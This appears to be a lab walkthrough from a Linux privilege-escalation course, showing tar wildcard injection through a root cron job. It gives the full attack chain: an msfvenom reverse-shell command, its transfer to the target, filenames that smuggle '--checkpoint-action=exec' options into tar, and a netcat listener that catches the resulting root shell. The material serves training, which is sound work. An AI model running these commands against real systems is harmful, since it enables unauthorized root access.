View the contents of the other cron job script:

`cat /usr/local/bin/compress.sh`

Note that the tar command is being run with a wildcard (\*) in your home directory.

![[Pasted image 20240223134001.png]]


Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

![[Pasted image 20240223134753.png]]

Transfer the shell.elf file to **/home/user/** on the Debian VM (you can use **scp** or host the file on a webserver on your Kali box and use **wget**). Make sure the file is executable:

```
scp -oHostKeyAlgorithms=+ssh-rsa shell.elf user@10.10.229.255:/home/user/
```

![[Pasted image 20240223141531.png]]

`chmod +x /home/user/shell.elf`

![[Pasted image 20240223141624.png]]

Create these two files in /home/user:

`touch /home/user/--checkpoint=1`   
`touch /home/user/--checkpoint-action=exec=shell.elf`


![[Pasted image 20240223141759.png]]


When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.  

`nc -nvlp 4444`  

![[Pasted image 20240223143221.png]]

Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

`rm /home/user/shell.elf`
`rm /home/user/--checkpoint=1`
`rm /home/user/--checkpoint-action=exec=shell.elf`  

Answer the questions below

Read and follow along with the above.
